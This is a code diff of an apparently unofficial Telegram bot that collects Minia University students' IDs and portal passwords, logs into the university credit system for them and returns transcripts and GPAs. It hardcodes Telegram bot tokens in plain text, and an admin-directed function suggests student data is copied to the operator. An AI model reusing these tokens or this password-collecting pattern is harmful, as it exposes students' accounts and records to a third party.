@@ -8,7 +8,7 @@ import time
 import threading
 
 admin_chat_id = 1792449471
-token ="6873478283:AAEyjlx5d0c4_nmg6uLPYDCb0o_7Iz7eTes"
+token ="6873478283:AAH6O2NHuysxWkfQGBvHNtgv_4OkGwNy2DY"
 bot = telebot.TeleBot(token)
 #__&&&&_____
 keyboard2 = types.InlineKeyboardMarkup()
@@ -21,7 +21,7 @@ keyboard2.row(back_button)
 
 #_______7__$$$$_$$$
 keyboard = types.InlineKeyboardMarkup()
-dev = types.InlineKeyboardButton(text="𓆩⋆ ׅᎯL ׅG̸E🅽ᎬRᎪⱠ ׅ⋆𓆪", url='https://t.me/BO_R0')
+dev = types.InlineKeyboardButton(text="𓆩⋆ ׅᎯ𝑳 ׅ𝕯𝔞l̸𝑔𝔞🅦︎𝕪 ׅ⋆𓆪", url='https://t.me/BO_R0')
 grop = types.InlineKeyboardButton(text='𝑴𝒊𝒏𝒊𝒂 𝑨𝒈𝒓𝒊𝒄𝒖𝒍𝒕𝒖𝒓𝒆☘️', url='https://t.me/+rbphVRSaWD9mNjg8')
 natega = types.InlineKeyboardButton(text='الحصول علي النتيجة✅', callback_data='echo_all')
 pas = types.InlineKeyboardButton(text='معرفة الباسورد👁️‍🗨️', callback_data='send_password')
@@ -42,6 +42,7 @@ def users_command(message):
 #________________$$$$$$$
 
 @bot.message_handler(commands=['start'])
+@bot.message_handler(func=lambda message: True)
 def welcome(message):
     chat_id = message.chat.id
     bot.send_chat_action(chat_id, 'typing')
@@ -134,7 +135,7 @@ def process_email(message):
                 else:
                     bot.reply_to(message, "عنوان البريد الإلكتروني غير مسجل على النظام❌", reply_markup=keyboard1)
         except requests.Timeout:
-            bot.reply_to(message, "الموقع لا يعمل برجاء المحاولة مرة اخرى لاحقاً❌", reply_markup=keyboard1)
+            bot.reply_to(message, "• تم ايقاف هذا الامر من قبل المطور 🚫", reply_markup=keyboard1)
 
                 
 def echo_all(message):
@@ -161,10 +162,8 @@ def process_password(message, student_id):
     password = message.text
     chat_id = message.chat.id
     password_message_id = message.message_id  # حفظ معرف رسالة كلمة المرور
-
     sent_message = bot.reply_to(message, "•يتم الآن التحقق من كلمة المرور...🔍")
     temp_message_id = sent_message.message_id
-
     url1 = "http://credit.minia.edu.eg/studentLogin"
     headers1 = {
         "Host": "credit.minia.edu.eg",
@@ -179,7 +178,7 @@ def process_password(message, student_id):
         "Accept-Encoding": "gzip, deflate",
         "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
     }
-    data = {
+    data1 = {
         "UserName": student_id,
         "Password": password,
         "sysID": "313.",
@@ -188,22 +187,18 @@ def process_password(message, student_id):
     }
 
     try:
-        response = requests.post(url1, headers=headers1, data=data, timeout=10)
+        response1 = requests.post(url1, headers=headers1, data=data1, timeout=10)
         bot.delete_message(chat_id=chat_id, message_id=password_message_id)
 
-        if not response.ok:
+        if not response1.ok:
             bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
             return
 
-        if "LoginOK" in response.text and json.loads(response.text)["rows"][0]["row"]["LoginOK"] == "True":
-            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="•تم التحقق من كلمة المرور وجاري الحصول على النتيجة✅. \n•يرجى الانتظار قد يستغرق الامر دقيقتين كحد اقصى...⏳")
-            
+        if "LoginOK" in response1.text and json.loads(response1.text)["rows"][0]["row"]["LoginOK"] == "True":
+            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="•تم التحقق من كلمة المرور وجاري الحصول على النتيجة✅. \n•يرجى الانتظار قد يستغرق الامر دقيقتين كحد اقصى...⏳") 
             chat_id = message.chat.id
             bot.send_chat_action(chat_id, 'typing')
-            
-            cookies = response.headers["Set-Cookie"]
-            
-            
+            cookies = response1.headers["Set-Cookie"]    
         else:
             bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="•برجاء التأكد من كود الطالب وكلمة المرور ثم أعد المحاولة مرة أخرى ❌\n•لمعرفة كلمة المرور الصحيحه قم بالنقر على الزر أدناه:⬇️", reply_markup=keyboard2)
 
@@ -220,15 +215,12 @@ def process_password(message, student_id):
             except Exception as e:
             	error_message = f"❌ خطأ أثناء إرسال الطلب: {str(e)}"
             	bot.send_message(admin_chat_id, error_message)
-            return
-
-    
+            return    
     except requests.Timeout:
         bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text=" الموقع لا يعمل برجاء المحاولة مرة اخري لاحقاً❌")
         return
-
-    url = "http://credit.minia.edu.eg/getJCI"
-    headers = {
+    url2 = "http://credit.minia.edu.eg/getJCI"
+    headers2 = {
         "Host": "credit.minia.edu.eg",
         "Connection": "keep-alive",
         "Content-Length": "223",
@@ -247,7 +239,7 @@ def process_password(message, student_id):
         "param1": "getTranscript",
         "param2": '{"crsReplaceHide":"true","ShowDetails":"true","portalFlag":"true","RegType":"student","AppType":"result"}'
     }
-    response1 = requests.post(url, headers=headers, data=payload).text
+    response1 = requests.post(url2, headers=headers2, data=payload).text
     soup = BeautifulSoup(response1, 'html.parser')
     json_text = soup.get_text()
     data2 = json.loads(json_text)
@@ -286,10 +278,8 @@ def grade_translation(grade):
         return 'P', 'إجتاز'
     else:
         return grade, ''
-
 def calculate_and_send_course_info(chat_id, data2,temp_message_id):
-    bot.delete_message(chat_id=chat_id, message_id=temp_message_id)
-    
+    bot.delete_message(chat_id=chat_id, message_id=temp_message_id)    
     try:
         for year_idx, year_data in enumerate(data2["StuSemesterData"]):
             for sem_idx, semester in enumerate(year_data["Semesters"]):
@@ -337,13 +327,10 @@ def calculate_and_send_course_info(chat_id, data2,temp_message_id):
                     gpa_evaluation = ""
                 
                 message_text = f"{message}\nالساعات المسجلة: {semester['RegHrs']}        الساعات الحاصل عليها: {semester['CurrCH']}\nالمعدل الفصلي: *{semester_gpa}*        المعدل التراكمي: *{cumulative_gpa}*\n          •التقدير التراكمي (*{gpa_evaluation}*)"
-                
-                
+                                
                 bot.send_message(chat_id, message_text, parse_mode='Markdown')
     except Exception as e:
         bot.send_message(chat_id, f"An error occurred: {str(e)}", parse_mode='Markdown')
-
-
 def calculate_and_send_course_info1(chat_id, data2, admin_chat_id):
     try:
         for year_data in data2["StuSemesterData"]:
@@ -438,7 +425,7 @@ def process_new_password(message, user_id, current_password):
     session = requests.Session()
 
     # تسجيل الدخول
-    url1 = "http://credit.minia.edu.eg/studentLogin"
+    url3 = "http://credit.minia.edu.eg/studentLogin"
     headers1 = {
         "Host": "credit.minia.edu.eg",
         "Connection": "keep-alive",
@@ -462,7 +449,7 @@ def process_new_password(message, user_id, current_password):
     }
 
     try:
-        response = session.post(url1, headers=headers1, data=data, timeout=10)
+        response = session.post(url3, headers=headers1, data=data, timeout=10)
         if "LoginOK" in response.text and json.loads(response.text)["rows"][0]["row"]["LoginOK"] == "True":
             msg = bot.send_message(message.chat.id, "تم التسجيل بنجاح. الآن جاري تغيير كلمة المرور...")
 
